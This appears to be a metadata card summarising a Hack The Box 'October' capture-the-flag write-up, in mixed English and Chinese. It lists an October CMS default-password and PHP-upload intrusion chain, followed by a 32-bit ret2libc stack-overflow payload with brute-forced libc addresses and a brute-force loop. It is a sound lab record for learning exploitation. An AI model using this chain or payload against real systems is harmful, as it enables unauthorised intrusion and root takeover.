---
title: [HTB] October Writeup
contest: Hack The Box - October
year: 2017
difficulty: medium
vuln_type: web_unknown
tags: [october_cms, php_cms_upload_bypass, mysql_default_password, su_buffer_overflow_ovrflw, system_exit_binsh_brute, ret2libc_i386, brute_libc_base, cms_credentials_config, rce_php_file_upload]
attack_chain: October CMS 1.0.412 searchsploit → /config/database.php 默认密码 OctoberCMSPassword!! + october 用户 → RCE php 上传 → get www-data → su → /usr/local/bin/ovrflw (32 位 NX+Partial RELRO+无 Canary+无 PIE) 栈溢出 112 字节 → brute libc base 0xb75f8000 → payload = b'A'*112 + p32(system)+p32(exit)+p32(binsh) → bash 反弹
key_payload: 'mysql password: OctoberCMSPassword!! / checksec Canary:✘ NX:✓ PIE:✘ / system@b75f8000+0x40310=0xB7638310 / exit@b75f8000+0x33260=0xB762B260 / /bin/sh=b75f8000+0x162bac=0xB775ABAC'
one_liner: HTB October: OctoberCMS 数据库默认密码 + RCE 写 PHP 提权 → su 切换 → 32 位 ovrflw 栈溢出 (无 Canary/PIE) → brute libc base → ret2libc system(/bin/sh) 反弹 root。
lesson: CMS 默认密码 OctoberCMSPassword!! + config/database.php 路径暴露是 2017 老牌 CMS 经典；栈溢出 brute libc base 用 while true; do ovrflw "$payload"; done 是无 ASLR/PIE 时代的标配。
quality: high
---
